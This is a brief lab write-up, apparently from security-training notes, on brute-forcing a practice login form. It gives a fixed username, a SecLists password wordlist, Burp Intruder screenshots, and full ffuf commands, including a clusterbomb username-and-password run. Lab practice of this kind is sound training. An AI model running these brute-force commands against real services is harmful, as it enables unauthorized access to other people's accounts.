## Lab 1 : Brute Force Authentication

`sudo apt install seclists`

- use jeremy as a user name
- use password payload ----> /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt

![Image](/img/labs-authentication01.png)

#### Brute Force With Burp Intruder

![Image](/img/2023-11-05_09-00.png)

![Image](/img/2023-11-05_09-04.png)

![Image](/img/2023-11-05_09-17.png)

#### Brute Force With Ffuf

- save request and edit request attack point with FUZZ
- super fast !!!! no rate limiting

![Image](/img/2023-11-05_09-19.png)

`ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814`

![Image](/img/2023-11-05_09-28.png)

---

## JUST ONE NOTE : How Can We Use Clusterbomb in Ffuf

- Edit request for attack points

`ffuf -request req2.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w pass.txt:FUZZPASS`
